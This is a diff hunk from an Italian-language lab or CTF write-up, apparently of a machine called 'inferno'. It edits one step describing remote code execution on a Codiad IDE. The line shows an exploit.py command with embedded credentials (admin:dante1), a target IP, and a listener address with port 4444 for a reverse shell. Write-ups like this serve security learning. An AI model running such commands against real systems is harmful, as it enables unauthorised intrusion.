@@ -52,7 +52,7 @@ Dopo aver scoperto che il sistema utilizza Codiad, un ambiente di sviluppo integ
 
 Successivamente, ho proceduto con l'esecuzione dei comandi necessari al fine di avere remote code execution. Ho eseguito tre terminali. Nel primo terminale ho eseguito:
 
-- `python2 exploit.py http://admin:dante1@10.0.2.11/inferno/ admin dante1 10.0.2.4 4444 linux`: esegue lo script Python exploit.py, passando parametri essenziali come l'URL, le credenziali, l'indirizzo IP, la porta e il sistema operativo di destinazione.
+- `python2 exploit.py http://admin:dante1@10.0.2.11/inferno/ admin dante1 10.0.2.4 4444 linux`: esegue lo script Python exploit.py, passando parametri essenziali come l'URL al cui interno sono state passate le credenziali di basic auth, le credenziali dell'applicativo Codiad, l'indirizzo ip della mia macchina kali, la porta e il sistema operativo di destinazione.
 
 Nel secondo terminale ho eseguito:
 
